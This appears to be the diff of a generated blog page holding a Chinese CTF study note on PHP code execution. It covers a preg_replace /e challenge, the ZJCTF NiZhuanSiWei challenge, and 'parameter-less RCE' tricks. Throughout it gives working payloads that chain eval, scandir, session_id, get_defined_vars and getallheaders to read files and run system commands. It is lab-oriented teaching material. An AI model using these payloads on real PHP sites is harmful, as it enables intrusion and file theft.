+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function getFlag()&#123;</span><br><span class="line">  @eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>固定解题格式： <code>\S*=$&#123;&#125;</code><br><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code><br>姿势一：使用<code>php://input</code>伪协议通过post传参需要注意请求包的类型是post<br><img src="/img/206.png"><br>姿势二：<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= // d2VsY29tZSB0byB0aGUgempjdGY= 解码后为 -----&gt;  welcome to the zjctf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&#x27;flag.php&#x27;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;  </span><br><span class="line">__tostring()方法在题目中</span><br><span class="line">$password = unserialize($password);</span><br><span class="line">echo $password; //触发魔术方法</span><br></pre></td></tr></table></figure>
+
+<p>X-Requested-With: XMLHttpRequest&#x2F;&#x2F;通常在发送 XMLHttpRequest 对象发起 AJAX 请求时<br>AJAX 请求:使用指一种创建交互式、快速动态网页应用的网页开发技术,好像和xml有关<br><img src="/img/207.png"><br>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://f921948c-4523-4885-a45b-936776836ace.node4.buuoj.cn:81/">http://f921948c-4523-4885-a45b-936776836ace.node4.buuoj.cn:81/</a> -e.php<br>python dirsearch.py -u URL -e.php<br>要有F12查看源代码查找flag的好习惯<br><code>$a = json_decode($_GET[&#39;json&#39;],true);</code><br>返回一个json数据格式解码后的关联数组<br>json &#x3D; {“x”:”wllm”}解码后就是</p>
+<h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><h3 id="方法一：利用scandir"><a href="#方法一：利用scandir" class="headerlink" title="方法一：利用scandir()"></a>方法一：利用scandir()</h3><p> 扫描当前目录内容 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(pos(localeconv()))); </span><br></pre></td></tr></table></figure>
+
+<p>localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。</p>
+<p>可以看到当前目录下有flag.php。 </p>
+<p><img src="/img/image-20231103210617480.png" alt="image-20231103210617480"></p>
+<p>通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名</span><br><span class="line">next() 输出数组中的当前元素和下一个元素的值。</span><br><span class="line">array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">pos() 输出数组中的当前元素的值。</span><br><span class="line">localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231103210652828.png" alt="image-20231103210652828"></p>
+<p>读取当前目录倒数第一位文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(getcwd())));</span><br><span class="line">show_source(current(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+
+<p><code>getcwd()</code> 函数用于获取当前工作目录的路径（当前工作目录是指PHP脚本正在执行的目录）。这个函数不需要任何参数，直接调用即可</p>
+<p>读取当前目录倒数第二位文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>随机返回当前目录文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>扫描上一级目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+
+<p><code>dirname()</code> 函数用于返回指定路径的目录部分。它会返回给定路径的父目录路径</p>
+<p>读取上级目录文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>查看和读取根目录文件:</p>
+<p>所获得的字符串第一位有几率是&#x2F;，需要多试几次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure>
+
+<p>payload解释：<br>● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br>● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br>● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名<br>● dirname(chdir(dirname()))配合切换文件路径</p>
+<h3 id="方法二：利用session-id（）"><a href="#方法二：利用session-id（）" class="headerlink" title="方法二：利用session_id（）"></a>方法二：利用session_id（）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">法一：</span><br><span class="line">?exp=highlight_file(session_id(session_start()));</span><br><span class="line">请求头：</span><br><span class="line">Cookie: PHPSESSID=flag.php</span><br><span class="line"></span><br><span class="line">法二 ：</span><br><span class="line">?exp=eval(hex2bin(session_id(session_start())));</span><br><span class="line">Cookie: PHPSESSID=706870696e666f28293b    //为什么要编码，因为PHPSESSID不允许括号</span><br><span class="line">(706870696e666f28293b为phpinfo();的十六进制编码)</span><br></pre></td></tr></table></figure>
+
+<p>在[GXYCTF2019]禁止套娃1中过滤掉了hex,但是我们已知flag.php是我们要读取的，所以直接法一即可</p>
+<p>session_start()开启session服务，session_id（）读取参数内容，hex2bin使16进制转换为字符串，因为SESSIONID只能为字母和数字</p>
+<p><img src="/img/image-20231123211213371.png" alt="image-20231123211213371"></p>
+<h3 id="方法三：利用get-defined-vars（）"><a href="#方法三：利用get-defined-vars（）" class="headerlink" title="方法三：利用get_defined_vars（）"></a>方法三：利用get_defined_vars（）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars());   //var_dump</span><br></pre></td></tr></table></figure>
+
+<p><code> get_defined_vars()</code>是一个 PHP 函数，用于获取当前作用域中已定义的所有变量的列表，并将它们存储在一个关联数组中</p>
+<p><img src="/img/image-20231104001910198.png" alt="image-20231104001910198"></p>
+<p>也可以右键源代码更加直观</p>
+<p><img src="/img/image-20231112230337261.png" alt="image-20231112230337261"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post传参：1=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231104002343239.png" alt="image-20231104002343239"></p>
+<p>我们可以将数组弹出，来间接获取我们想要的payload，从而达到绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print(array_pop((next((get_defined_vars())))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231104003019833.png" alt="image-20231104003019833"></p>
+<p>我们这里也是直接将post传参改成我们需要的了</p>
+<p><img src="/img/image-20231104003059244.png" alt="image-20231104003059244"></p>
+<p>直接配合嵌套eval函数</p>
+<p>逻辑是内层eval执行返回<code>system(&quot;cat flag.php&quot;);</code>,然后外层eval执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop((next((get_defined_vars())))));</span><br><span class="line">?c=eval(array_pop((current((get_defined_vars())))));</span><br></pre></td></tr></table></figure>
+
+<p><code>current()</code> 函数用于返回数组中的当前元素的值</p>
+<p><img src="/img/image-20231104003153294.png" alt="image-20231104003153294"></p>
+<p>需要注意的是方法二和方法三都要用到嵌套eval才能执行</p>
+<h3 id="方法四：利用getallheaders"><a href="#方法四：利用getallheaders" class="headerlink" title="方法四：利用getallheaders()"></a>方法四：利用getallheaders()</h3><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。<code>implode()</code>能够直接将<code>getallheaders()</code>返回的数组转化为字符串</p>
+<p><img src="/img/image-20231123210800598.png" alt="image-20231123210800598"></p>
+<p>可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p>
+<p><img src="/img/image-20231123210811018.png" alt="image-20231123210811018"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=eval(implode(getallheaders()));</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1722200646272849215&wfr=spider&for=pc">使用无参数函数进行命令执行</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/124538469">[GXYCTF2019]禁止套娃1（两种方法）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120738755">无参数RCE总结</a></p>
+<p>全：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/133808536">无参数RCE绕过的详细总结（六种方法）</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" rel="next" title="php反序列化">
+                <i class="fa fa-chevron-left"></i> php反序列化
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/linux.html" rel="prev" title="linux">
+                linux <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">可能存在代码执行漏洞的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.1.</span> <span class="nav-text">前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">3.2.</span> <span class="nav-text">执行系统命令的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LD-PRELOAD%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.</span> <span class="nav-text">LD_PRELOAD绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="nav-number">3.4.</span> <span class="nav-text">linux连接符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%BB%95%E8%BF%87"><span class="nav-number">3.5.</span> <span class="nav-text">linux绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">3.6.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="nav-number">3.7.</span> <span class="nav-text">读取文件绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.8.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.9.</span> <span class="nav-text">无回显时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">3.10.</span> <span class="nav-text">长度过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E4%B8%BA7%E7%BB%95%E8%BF%87"><span class="nav-number">3.11.</span> <span class="nav-text">长度过滤为7绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA5%E7%BB%95%E8%BF%87"><span class="nav-number">3.12.</span> <span class="nav-text">长度限制为5绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="nav-number">3.13.</span> <span class="nav-text">内联执行绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctfshow%E4%B8%AD%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF"><span class="nav-number">4.</span> <span class="nav-text">ctfshow中学到的新姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB31"><span class="nav-number">4.1.</span> <span class="nav-text">WEB31</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web32"><span class="nav-number">4.2.</span> <span class="nav-text">web32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web37"><span class="nav-number">4.3.</span> <span class="nav-text">web37</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web39"><span class="nav-number">4.4.</span> <span class="nav-text">web39</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web40"><span class="nav-number">4.5.</span> <span class="nav-text">web40</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web41"><span class="nav-number">4.6.</span> <span class="nav-text">web41</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web43"><span class="nav-number">4.7.</span> <span class="nav-text">web43</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web50"><span class="nav-number">4.8.</span> <span class="nav-text">web50</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web52"><span class="nav-number">4.9.</span> <span class="nav-text">web52</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web54"><span class="nav-number">4.10.</span> <span class="nav-text">web54</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web55"><span class="nav-number">4.11.</span> <span class="nav-text">web55</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web57"><span class="nav-number">4.12.</span> <span class="nav-text">web57</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web58"><span class="nav-number">4.13.</span> <span class="nav-text">web58</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web60"><span class="nav-number">4.14.</span> <span class="nav-text">web60</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web66"><span class="nav-number">4.15.</span> <span class="nav-text">web66</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web71"><span class="nav-number">4.16.</span> <span class="nav-text">web71</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web72"><span class="nav-number">4.17.</span> <span class="nav-text">web72</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web73"><span class="nav-number">4.18.</span> <span class="nav-text">web73</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-75"><span class="nav-number">4.19.</span> <span class="nav-text">web 75</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web77"><span class="nav-number">4.20.</span> <span class="nav-text">web77</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web79"><span class="nav-number">4.21.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web80"><span class="nav-number">4.22.</span> <span class="nav-text">web80</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping-1"><span class="nav-number">5.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="nav-number">6.</span> <span class="nav-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%8F%82rce"><span class="nav-number">7.</span> <span class="nav-text">无参rce</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%88%A9%E7%94%A8scandir"><span class="nav-number">7.1.</span> <span class="nav-text">方法一：利用scandir()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8session-id%EF%BC%88%EF%BC%89"><span class="nav-number">7.2.</span> <span class="nav-text">方法二：利用session_id（）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8get-defined-vars%EF%BC%88%EF%BC%89"><span class="nav-number">7.3.</span> <span class="nav-text">方法三：利用get_defined_vars（）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E5%88%A9%E7%94%A8getallheaders"><span class="nav-number">7.4.</span> <span class="nav-text">方法四：利用getallheaders()</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzklov</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
